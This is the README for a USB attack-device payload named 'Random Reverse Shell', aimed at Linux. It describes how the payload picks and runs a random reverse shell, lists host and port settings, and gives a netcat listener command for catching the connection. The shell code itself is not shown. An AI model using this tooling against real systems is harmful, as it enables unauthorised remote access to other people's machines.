# Random Reverse Shell

- Title:         Random Reverse Shell
- Author:        TW-D
- Version:       1.0
- Target:        Linux
- Category:      Remote Access

## Description

1) Checks the availability of binaries on the system.
2) Builds a list of possible payloads.
3) Performs one at random.

## Configuration

From "payload.txt" change the values of the following constant :
```bash

######## INITIALIZATION ########

readonly BB_LABEL="BashBunny"
readonly REMOTE_HOST="127.0.0.1"
readonly REMOTE_PORT=54424

```

## Usage

```
hacker@hacker-computer:~$ nc -lnvvp <REMOTE_PORT>
```